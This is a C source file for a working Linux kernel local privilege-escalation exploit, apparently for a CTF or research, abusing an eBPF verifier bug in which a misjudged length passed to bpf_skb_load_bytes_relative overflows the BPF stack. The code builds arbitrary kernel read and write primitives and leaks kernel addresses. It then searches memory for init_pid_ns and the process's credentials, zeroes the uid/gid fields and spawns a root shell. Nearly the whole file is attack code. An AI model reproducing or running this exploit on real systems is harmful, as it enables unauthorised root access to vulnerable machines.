#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include "bpf_helper.h"
#include "bpf_insn.h"
#include "radix_tree.h"

#define BUFF_LEN 0x40
#define BPF_MAP_VALUE_OFFSET 0xd0
#define PID_TASKS_OFFSET 0x10

struct context
{
    int map_fd;
    uint64_t bpf_map;
    uint64_t array_map_ops;
    uint64_t __kstrtab_init_pid_ns;
    uint64_t __ksymtab_init_pid_ns;
    uint64_t init_pid_ns;
    struct pid *pid_struct;
    uint64_t task_struct_cred;
    uint64_t value_buff[BUFF_LEN];
};

struct context context;

void init()
{
    context.map_fd = bpf_map_create(sizeof(context.value_buff), 1);
}

void leak_bpf_map_addr()
{
    printf("[*] Leak bpf map address\n");

    struct bpf_insn insns[] = {
        // Save the address of skb
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r7 = map_lookup_elem(map_fd, &key)
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, context.map_fd),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        /* Trigger vulnerability here */
        // Make the checker thinks that r4 == 8, but in reality r4 == 9
        
        // trigger stack overflow: set [fp - 0x80] == &bpf_map + 0x100
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x40), // r0 == (&bpf->value) == &bpf + 0x110 + 0x40 == &bpf + 0x150
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_7, -0x80), // [fp - 0x80] == &bpf_map + 0x150
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x88),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative),

        // Leak &bpf_map
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -0x80), // r8 = &bpf_map + 0x100
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, 0x40), // r8 = &bpf_map + 0xc0
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_7, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    char data[0x9] = {}; // the last bit is for stack overflow
    run_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]), data, 0x9);
    uint32_t key = 0;
    bpf_map_lookup_elem(context.map_fd, &key, context.value_buff);
    context.bpf_map = context.value_buff[0] - 0xc0;

    // restore value
    context.value_buff[0] = 0;
    bpf_map_update_elem(context.map_fd, &key, context.value_buff, 0);

    printf("[+] bpf_map = %p\n", context.bpf_map);
}

uint64_t arb_read_64(uint64_t addr)
{
    struct bpf_insn insns[] = {

        // Save the address of skb
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r7 = map_lookup_elem(map_fd, &key)
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, context.map_fd),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        /* Trigger vulnerability here */
        // Make the checker thinks that r4 == 8, but in reality r4 == 9

        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -0x80), // [fp - 0x80] = &bpf_map

        // trigger stack overflow: set [fp - 0x80] == &bpf_map + 0x100
        // bpf_skb_load_bytes_relative(skb, 0, sp - 0x88, r4)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x88),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative),

        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_10, -0x80),
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_9, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
        
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    uint64_t data[2] = {};
    data[1] = addr;
    run_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]), (char *)data, 0x10);

    // read the value from map
    uint32_t key = 0;
    bpf_map_lookup_elem(context.map_fd, &key, context.value_buff);
    uint64_t value = context.value_buff[0];

    // restore value
    context.value_buff[0] = 0;
    bpf_map_update_elem(context.map_fd, &key, context.value_buff, 0);
    return value;
}

void arb_read_size(uint64_t addr, void *buff, int size)
{
    int tmp_size = ((size - 1) / 8) + 1;
    uint64_t *tmp = (uint64_t *)malloc(tmp_size * 8);
    for (int i = 0; i < tmp_size; i++) {
        tmp[i] = arb_read_64(addr + i * 8);
    }
    memcpy(buff, tmp, size);
    free(tmp);
}

void leak_array_map_ops_addr()
{
    printf("[*] Leak array_map_ops address\n");
    context.array_map_ops = arb_read_64(context.bpf_map);
}

uint64_t arb_write_32(uint64_t addr, uint32_t value)
{
    struct bpf_insn insns[] = {

        // Save the address of skb
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r7 = map_lookup_elem(map_fd, &key)
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, context.map_fd),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        /* Trigger vulnerability here */
        // Make the checker thinks that r4 == 8, but in reality r4 == 9

        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -0x80), // [fp - 0x80] = &bpf_map

        // trigger stack overflow: set [fp - 0x80] == &bpf_map + 0x100
        // bpf_skb_load_bytes_relative(skb, 0, sp - 0x88, r4)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x88),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative),

        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_10, -0x80),
        BPF_MOV64_IMM(BPF_REG_7, value),
        BPF_STX_MEM(BPF_W, BPF_REG_9, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    uint64_t data[2] = {};
    data[1] = addr;
    run_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]), (char *)data, 0x10);

    // restore value
    uint32_t key = 0;
    context.value_buff[0] = 0;
    bpf_map_update_elem(context.map_fd, &key, context.value_buff, 0);
    return value;
}

void search_init_pid_ns_kstrtab()
{
    char init_pid_ns_str[] = "init_pid_ns";
    const uint64_t page_size = 0x1000;
    char buff[page_size];

    printf("[*] Looking for kstrtab of init_pid_ns. This may take a while ...\n");

    for (uint64_t addr = (context.array_map_ops & ~0xfff); ; addr += page_size) {
        arb_read_size(addr, (uint64_t *)buff, page_size);
        void *substr = memmem(buff, page_size, init_pid_ns_str, sizeof(init_pid_ns_str));

        if (substr) {
            int offset = substr - (void *)buff;
            context.__kstrtab_init_pid_ns = addr + offset;
            printf("[+] Found __kstrtab_init_pid_ns = %p\n", context.__kstrtab_init_pid_ns);
            return;
        }
    }
    printf("[-] __kstrtab_init_pid_ns not found\n");
    exit(1);
}

void search_init_pid_ns_ksymtab()
{
    printf("[*] Looking for ksymtab of init_pid_ns. This may take a while ...\n");
    for (uint64_t addr = (context.array_map_ops & ~0x3); ; addr += 4) {
        uint32_t offset;
        arb_read_size(addr, &offset, 4);
        if (addr + offset == context.__kstrtab_init_pid_ns) {
            context.__ksymtab_init_pid_ns = addr - 4;
            printf("[+] Found __ksymtab_init_pid_ns = %p\n", context.__ksymtab_init_pid_ns);
            return;
        }
    }
    printf("[-] __ksymtab_init_pid_ns not found\n");
    exit(1);
}

void get_init_pid_ns_addr()
{
    uint32_t init_pid_ns_offset;
    arb_read_size(context.__ksymtab_init_pid_ns, &init_pid_ns_offset, 4);
    context.init_pid_ns = context.__ksymtab_init_pid_ns + init_pid_ns_offset;
    printf("[+] init_pid_ns = %p\n", context.init_pid_ns);
}

void get_pid_struct()
{
    pid_t pid = getpid();
    struct pid_namespace ns;
    arb_read_size(context.init_pid_ns, &ns, sizeof(ns));
    context.pid_struct = find_pid_ns(pid, &ns);
    printf("[+] pid struc = %p\n", context.pid_struct);
}

void get_cred()
{
    uint64_t task_first;
    arb_read_size((uint64_t)(context.pid_struct) + PID_TASKS_OFFSET, &task_first, sizeof(uint64_t));

    prctl(PR_SET_NAME, "AAAAAAAA");
    uint64_t task_struct_cred = task_first;
    while (true) {
        uint64_t value;
        arb_read_size(task_struct_cred, &value, sizeof(value));
        if (value == 0x4141414141414141) {
            break;
        }
        task_struct_cred += 8;
    }
    task_struct_cred -= 0x10;

    arb_read_size(task_struct_cred, &context.task_struct_cred, 8);
    printf("[+] task_struct.cred = %p\n", context.task_struct_cred);
}

void overwrite_cred()
{
    arb_write_32(context.task_struct_cred + 0x4, 0);
    arb_write_32(context.task_struct_cred + 0x8, 0);
    arb_write_32(context.task_struct_cred + 0x14, 0);
}

void spawn_shell()
{
    system("/bin/sh");
}

int main()
{
    init();
    leak_bpf_map_addr();
    leak_array_map_ops_addr();
    search_init_pid_ns_kstrtab();
    search_init_pid_ns_ksymtab();
    get_init_pid_ns_addr();
    get_pid_struct();
    get_cred();
    overwrite_cred();
    spawn_shell();
}
